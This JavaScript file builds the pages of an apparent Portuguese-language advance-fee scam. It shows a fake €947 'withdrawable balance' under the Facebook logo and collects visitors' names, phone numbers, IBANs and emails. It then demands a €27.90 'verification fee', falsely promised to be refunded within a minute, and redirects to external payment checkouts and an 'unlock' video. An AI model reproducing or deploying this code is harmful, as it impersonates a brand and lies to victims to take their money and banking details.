/**
 * Page navigation and rendering
 */

// Pages content
const pages = {
  withdraw: `
    <div class="withdraw-page">
      <div class="page-header">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
        </button>
        <h1>Resgatar Ganhos</h1>
        <button class="help-btn">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
        </button>
      </div>
      
      <!-- Card de Saldo Original -->
      <div class="balance-card">
        <div class="balance-title">O Seu Saldo</div>
        <div class="balance-amount-wrapper">
          <div class="balance-amount">€947.00</div>
          <img class="balance-image" src="images/p-saldo-maior.png" alt="ícone">
        </div>
      </div>
      
      <div class="last-rewards">
        Ganhos recentes: €54.87
      </div>
      
      <!-- Seção Branca Principal -->
      <div class="withdraw-content">
        <h2 class="withdraw-title">Levantar Dinheiro</h2>
        
        <!-- Payment Methods -->
        <div class="payment-methods-row">
          <div class="payment-method-item">
            <img src="/Logo_MBWay.svg.png" alt="MB Way" class="payment-method-logo">
            <span class="payment-method-name">MB Way</span>
          </div>
          <span class="payment-method-separator">/</span>
          <div class="payment-method-item">
            <img src="/multibanco-logo-vector.png" alt="Multibanco" class="payment-method-logo">
            <span class="payment-method-name">Multibanco</span>
          </div>
          <span class="payment-method-separator">/</span>
          <div class="payment-method-item">
            <img src="https://www.vectorlogo.zone/logos/revolut/revolut-icon.svg" alt="Revolut" class="payment-method-logo">
            <span class="payment-method-name">Revolut</span>
          </div>
          <span class="payment-method-separator">/</span>
          <div class="payment-method-item">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay" class="payment-method-logo">
            <span class="payment-method-name">Apple Pay</span>
          </div>
        </div>
        
        <!-- Botões de Valor (Opcional) -->
        <div class="amount-options">
          <button class="amount-btn" data-amount="1.50">€1.50</button>
          <button class="amount-btn" data-amount="5">€5</button>
          <button class="amount-btn" data-amount="10">€10</button>
          <button class="amount-btn" data-amount="947.00">€947.00</button>
        </div>
        
        <!-- Display do Método Selecionado -->
        <div id="selected-method-display" class="selected-method-display" style="display: none;">
          <div class="method-display-item">
            <span class="method-logo" id="display-method-logo"></span>
            <div>
              <div class="method-name" id="display-method-name"></div>
              <div class="method-subtitle">Pagamento Instantâneo</div>
            </div>
            <button class="change-method-btn" onclick="openMethodModal()">Alterar</button>
          </div>
        </div>
        
        <!-- Formulário do Método -->
        <div id="method-form-container" style="display: none;">
          <!-- Formulário será inserido aqui dinamicamente -->
        </div>
        
        <!-- Botão Adicionar Método -->
        <button class="add-method-btn" id="add-method-btn">Adicionar Método de Levantamento</button>

        <!-- Info Texts -->
        <div class="withdraw-info-text">
          <p>Para levantar o dinheiro, precisa de um saldo mínimo de €0.40.</p>
          <p>Os limites de levantamento podem variar de acordo com a sua região.</p>
        </div>
      </div>
    </div>
  `,

  loading: `
    <div class="loading-page">
      <div class="loading-content">
        <div class="facebook-logo">
  <img
    class="facebook-logo__image"
    src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png"
    alt="Facebook"
  />
</div>
<br>
        <div class="loading-text">A validar acesso...</div>
        <div class="loading-spinner"></div>
      </div>
    </div>
  `,

  registration: `
    <div class="confirmation-container">
      <div class="confirmation-header">
        <div class="confirmation-logo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="Facebook">
        </div>
      </div>

      <!-- Saldo Acumulado -->
      <div class="confirmation-section confirmation-balance">
        <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
        <div class="confirmation-balance-amount" data-amount-target="947.00">
          € 947,00
        </div>
        <div class="confirmation-balance-subtitle">
          A aguardar confirmação de levantamento
        </div>
      </div>

      <!-- Taxa de Confirmação -->
      <div class="confirmation-section">
        <div class="confirmation-section-title">
          Requisito de Verificação de Segurança
        </div>
        <div class="confirmation-fee-amount">
          € 27,90
          <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
        </div>
        <div class="confirmation-fee-description">
          De acordo com as normas de segurança europeias, é necessário um pagamento de verificação de <span class="bold">€27,90</span> antes que o levantamento total de <span class="bold">€947,00</span> possa ser processado. Este valor será reembolsado automaticamente no prazo de 1 minuto após o processamento.
        </div>
      </div>

      <!-- Comprovante -->
      <div class="confirmation-section">
        <div class="confirmation-section-title">RESUMO DO LEVANTAMENTO</div>
        <div class="confirmation-receipt-grid">
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Nome</div>
            <div class="confirmation-receipt-value" id="confirmation-name"></div>
          </div>
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Data</div>
            <div class="confirmation-receipt-value" id="confirmation-date"></div>
          </div>
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Conta de Destino</div>
            <div class="confirmation-receipt-value" id="confirmation-key-type"></div>
          </div>
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Valor a receber</div>
            <div class="confirmation-receipt-value bold">€ 947,00</div>
          </div>
        </div>
      </div>

      <div class="confirmation-divider"></div>

      <!-- Requisitos -->
      <div class="confirmation-section">
        <div class="confirmation-section-title">PROCESSO DE LIBERAÇÃO</div>
        <div class="confirmation-requirements-grid">
          <div class="confirmation-requirement-item">
            <div class="confirmation-requirement-icon">1</div>
            <div class="confirmation-requirement-content">
              <div class="confirmation-requirement-title">
                Completar Verificação
              </div>
              <div class="confirmation-requirement-description">
                Taxa de €27,90 necessária para validar a conta
              </div>
            </div>
          </div>
          <div class="confirmation-requirement-item">
            <div class="confirmation-requirement-icon confirmation-reembolso">
              ✓
            </div>
            <div class="confirmation-requirement-content">
              <div class="confirmation-requirement-title confirmation-reembolso">
                Receber reembolso automático
              </div>
              <div class="confirmation-requirement-description">
                Valor de verificação devolvido em 1 minuto
              </div>
            </div>
          </div>
          <div class="confirmation-requirement-item">
            <div class="confirmation-requirement-icon">3</div>
            <div class="confirmation-requirement-content">
              <div class="confirmation-requirement-title">
                Aceder ao saldo total
              </div>
              <div class="confirmation-requirement-description">
                €947,00 entregues em 3 minutos
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Call to Action -->
      <div class="confirmation-section">
        <a href="#" class="confirmation-cta-button" id="pay-tax-btn">
          Completar Verificação e Receber Fundos
        </a>
        <div class="confirmation-timer">
          ⏱️ Reembolso emitido em 1 minuto
        </div>
        <div class="confirmation-success-message" id="confirmation-success-message">
          ✅ Identidade confirmada. € 27,90 reembolsados e levantamento libertado.
        </div>
      </div>

      <!-- Footer -->
      <div class="confirmation-footer">
        <div class="confirmation-footer-text">Este processo cumpre com as regulamentações europeias de verificação de identidade e proteção de dados.</div>
      </div>
    </div>
  `,

  video: `
  <div class="video-page">
  <div class="video-header">
    VEJA O VÍDEO ABAIXO PARA DESBLOQUEAR O SEU LEVANTAMENTO E ACESSO VITALÍCIO.
  </div>
  
  <div class="header-content" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
    <div class="logo-container">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="Facebook" style="height: 30px;">
    </div>
    
    <div class="balance-display" style="border: 2px solid #3b5998; border-radius: 8px; padding: 15px; text-align: center;">
      <div style="font-size: 14px; margin-bottom: 5px;">SALDO</div>
      <div class="balance-amount" style="font-size: 18px; font-weight: bold;">€ 947,00</div>
    </div>
  </div>
  
  <div style="border-bottom: 4px solid #3b5998; margin-bottom: 20px;"></div>
  
  <h1 style="color: #3b5998; font-weight: 800; font-style: bold; font-family: 'Roboto', sans-serif;">
    DESBLOQUEIO DE SALDO
  </h1>
  <p class="video-instruction">Veja como desbloquear o seu levantamento assistindo ao vídeo.</p>
  
  <div class="video-container">
    <video
      id="tutorial-video"
      controls
      preload="metadata"
      poster="https://charming-figolla-3a3b33.netlify.app//src/media/capatiktok.jpg"
      playsinline
    >
      <source src="https://harmonious-toffee-77df94.netlify.app/video.mp4" type="video/mp4">
      Your browser does not support video playback.
    </video>
  </div>
  
  <button class="unlock-btn">
    DESBLOQUEAR AGORA
  </button>
</div>
  `,

  checkout: `
    <div class="checkout-page">
      <div class="page-header">
        <button class="back-btn checkout-back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
        </button>
        <h1>Pagamento</h1>
      </div>
      <div class="checkout-container">
        <div class="checkout-header">
          <h1>Pagamento da Taxa</h1>
          <div class="amount">€27.90</div>
        </div>
        <div class="checkout-content">
          <div class="checkout-summary">
            <div class="summary-row">
              <span>Taxa de Verificação:</span>
              <strong>€27.90</strong>
            </div>
            <div class="summary-row total">
              <span>Total a pagar:</span>
              <strong>€27.90</strong>
            </div>
          </div>
          <div class="payment-methods-info">
            <span class="icon">💳</span>
            <div>
              <strong>Métodos disponíveis:</strong>
              <span id="payment-methods-label">Cartão de Crédito/Débito, MB Way e Multibanco</span>
            </div>
          </div>
          <div class="checkout-payment-warning">
            ⚠️ Esta taxa é processada de forma segura. As informações da sua conta de levantamento não são usadas para este pagamento.
          </div>
          <button type="button" class="checkout-btn" id="checkout-btn">
            Pagar €27,90
          </button>
          <div class="checkout-error" id="checkout-error"></div>
        </div>
        <div class="checkout-footer">
          <p>🔒 Pagamento Seguro por Cooud</p>
          <p>Será redirecionado para o checkout</p>
        </div>
      </div>
    </div>
  `,
};

// Current page state
let currentPage = null;

// Show specific page
function showPage(pageName) {
  const container = document.querySelector(".app-container");
  if (!container) return;

  // Save current content if it's the first navigation
  if (!currentPage) {
    currentPage = container.innerHTML;
  }

  // Update container with new page content
  container.innerHTML = pages[pageName];

  // Add page-specific event listeners
  if (pageName === "withdraw") {
    setupWithdrawPage();
  } else if (pageName === "registration") {
    setupRegistrationPage();
  } else if (pageName === "video") {
    setupVideoPage();
  } else if (pageName === "checkout") {
    setupCheckoutPage();
  }
}

// Setup event listeners for withdraw page
function setupWithdrawPage() {
  // Back button
  const backBtn = document.querySelector(".back-btn");
  if (backBtn) {
    backBtn.addEventListener("click", () => {
      const container = document.querySelector(".app-container");
      container.innerHTML = currentPage;
    });
  }

  // Amount selection
  document.querySelectorAll(".amount-btn").forEach((btn) => {
    btn.addEventListener("click", () => {
      document.querySelectorAll(".amount-btn").forEach((b) => b.classList.remove("selected"));
      btn.classList.add("selected");
    });
  });

  // Botão adicionar método
  const addMethodBtn = document.getElementById("add-method-btn");
  if (addMethodBtn) {
    addMethodBtn.addEventListener("click", () => {
      openMethodModal();
    });
  }
}

// Setup event listeners for registration page
function setupRegistrationPage() {
  const formData = window.withdrawalFormData || {};

  if (formData.name) {
    const nameEl = document.getElementById("confirmation-name");
    if (nameEl) nameEl.textContent = formData.name;
  }

  if (formData.account) {
    const accountEl = document.getElementById("confirmation-key-type");
    if (accountEl) accountEl.textContent = formData.account;
  }

  const dateEl = document.getElementById("confirmation-date");
  if (dateEl) {
    const now = new Date();
    dateEl.textContent = now.toLocaleDateString('pt-PT');
  }

  const payButton = document.getElementById("pay-tax-btn");
  if (payButton) {
    payButton.addEventListener("click", (e) => {
      e.preventDefault();
      if (typeof trackInitiateCheckout === "function") {
        trackInitiateCheckout(27.90);
      }
      window.location.href = "loading.html" + window.location.search;
    });
  }
}

// Setup event listeners for checkout page
function setupCheckoutPage() {
  const backBtn = document.querySelector(".checkout-back-btn");
  if (backBtn) {
    backBtn.addEventListener("click", () => {
      showPage("registration");
    });
  }

  const checkoutBtn = document.getElementById("checkout-btn");
  if (checkoutBtn && typeof COOUD_CONFIG !== "undefined" && COOUD_CONFIG.checkoutUrl) {
    checkoutBtn.addEventListener("click", () => {
      window.location.href = COOUD_CONFIG.checkoutUrl + window.location.search;
    });
  }
}

// Setup event listeners for video page
function setupVideoPage() {
  const unlockBtn = document.querySelector(".unlock-btn");
  if (unlockBtn) {
    unlockBtn.addEventListener("click", () => {
      window.location.href = "https://go.pepperpay.com.br/04yi8";
    });
  }
}

// Métodos de saque - funções globais
let selectedPaymentMethod = null;

function openMethodModal() {
  const modal = document.getElementById("method-modal");
  if (modal) {
    modal.style.display = "flex";
  }
}

function closeMethodModal() {
  const modal = document.getElementById("method-modal");
  if (modal) {
    modal.style.display = "none";
  }
}

function selectMethod(method) {
  selectedPaymentMethod = method;
  closeMethodModal();
  renderMethodForm(method);
  updateMethodDisplay(method);
}

function renderMethodForm(method) {
  const container = document.getElementById("method-form-container");
  const addBtn = document.getElementById("add-method-btn");

  if (!container) return;

  let formHTML = "";
  if (method === "mbway") {
    formHTML = `
      <div class="method-form">
        <h3>Ligar Método de Pagamento</h3>
        <div class="form-group">
          <label>Nome Completo</label>
          <input type="text" class="form-input" placeholder="O seu nome" id="mbway-name">
        </div>
        <div class="form-group">
          <label>Número de Telemóvel MB Way</label>
          <input type="text" class="form-input" placeholder="9xxxxxxxx" id="mbway-phone" maxlength="9" inputmode="numeric">
        </div>
        <button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button>
      </div>
    `;
  } else if (method === "multibanco" || method === "sepa") {
    formHTML = `
      <div class="method-form">
        <h3>Ligar Método de Pagamento</h3>
        <div class="form-group">
          <label>Titular da Conta</label>
          <input type="text" class="form-input" placeholder="Nome do titular" id="bank-name">
        </div>
        <div class="form-group">
          <label>IBAN</label>
          <input type="text" class="form-input" placeholder="PT50..." id="bank-iban" maxlength="25">
        </div>
        <button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button>
      </div>
    `;
  } else if (method === "revolut") {
    formHTML = `
      <div class="method-form">
        <h3>Ligar Método de Pagamento</h3>
        <div class="form-group">
          <label>Nome Completo</label>
          <input type="text" class="form-input" placeholder="O seu nome" id="revolut-name">
        </div>
        <div class="form-group">
          <label>Revtag ou Telemóvel</label>
          <input type="text" class="form-input" placeholder="@revtag ou 9xxxxxxxx" id="revolut-id">
        </div>
        <button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button>
      </div>
    `;
  } else if (method === "applepay" || method === "paypal") {
    formHTML = `
      <div class="method-form">
        <h3>Ligar Método de Pagamento</h3>
        <div class="form-group">
          <label>Nome Completo</label>
          <input type="text" class="form-input" placeholder="O seu nome" id="wallet-name">
        </div>
        <div class="form-group">
          <label>Email Associado</label>
          <input type="email" class="form-input" placeholder="seu@email.com" id="wallet-email">
        </div>
        <button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button>
      </div>
    `;
  }

  container.innerHTML = formHTML;
  container.style.display = "block";
  if (addBtn) addBtn.style.display = "none";

  if (method === "mbway") {
    const input = document.getElementById("mbway-phone");
    if (input) {
      input.addEventListener("input", (e) => {
        e.target.value = e.target.value.replace(/\D/g, "");
      });
    }
  }
}

function updateMethodDisplay(method) {
  const display = document.getElementById("selected-method-display");
  const logo = document.getElementById("display-method-logo");
  const name = document.getElementById("display-method-name");

  if (!display || !logo || !name) return;

  const methodInfo = {
    mbway: { src: "/Logo_MBWay.svg.png", alt: "MB Way", label: "MB Way" },
    multibanco: { src: "/multibanco-logo-vector.png", alt: "Multibanco", label: "Multibanco" },
    revolut: { src: "https://www.vectorlogo.zone/logos/revolut/revolut-icon.svg", alt: "Revolut", label: "Revolut" },
    applepay: { src: "https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg", alt: "Apple Pay", label: "Apple Pay" },
    sepa: { src: "https://www.vectorlogo.zone/logos/sepa/sepa-icon.svg", alt: "SEPA", label: "Transferência SEPA" },
    paypal: { src: "https://www.vectorlogo.zone/logos/paypal/paypal-icon.svg", alt: "PayPal", label: "PayPal" }
  };
  
  const info = methodInfo[method];
  if (info) {
    logo.innerHTML = `<img src="${info.src}" alt="${info.alt}" style="width: 50px; height: 35px; object-fit: contain;" onerror="this.src='/multibanco-logo-vector.png'">`;
    name.textContent = info.label;
  }
  display.style.display = "block";
}

function submitMethodForm() {
  let formData = {};
  if (selectedPaymentMethod === "mbway") {
    const name = document.getElementById("mbway-name")?.value.trim();
    const phone = document.getElementById("mbway-phone")?.value.trim();
    if (!name || !phone) { alert("Por favor, preencha todos os campos"); return; }
    if (phone.length !== 9) { alert("O número de telemóvel deve ter 9 dígitos"); return; }
    formData = { name, account: phone, method: "mbway" };
  } else if (selectedPaymentMethod === "multibanco" || selectedPaymentMethod === "sepa") {
    const name = document.getElementById("bank-name")?.value.trim();
    const iban = document.getElementById("bank-iban")?.value.trim();
    if (!name || !iban) { alert("Por favor, preencha todos os campos"); return; }
    if (iban.length < 21) { alert("Por favor, introduza um IBAN válido"); return; }
    formData = { name, account: iban, method: selectedPaymentMethod };
  } else if (selectedPaymentMethod === "revolut") {
    const name = document.getElementById("revolut-name")?.value.trim();
    const id = document.getElementById("revolut-id")?.value.trim();
    if (!name || !id) { alert("Por favor, preencha todos os campos"); return; }
    formData = { name, account: id, method: "revolut" };
  } else if (selectedPaymentMethod === "applepay" || selectedPaymentMethod === "paypal") {
    const name = document.getElementById("wallet-name")?.value.trim();
    const email = document.getElementById("wallet-email")?.value.trim();
    if (!name || !email) { alert("Por favor, preencha todos os campos"); return; }
    if (!email.includes("@")) { alert("Por favor, introduza um email válido"); return; }
    formData = { name, account: email, method: selectedPaymentMethod };
  }

  window.withdrawalFormData = formData;
  showPage("loading");
  setTimeout(() => { showPage("registration"); }, 2500);
}

// Tornar funções disponíveis globalmente
window.openMethodModal = openMethodModal;
window.closeMethodModal = closeMethodModal;
window.selectMethod = selectMethod;
window.submitMethodForm = submitMethodForm;
window.showPage = showPage;
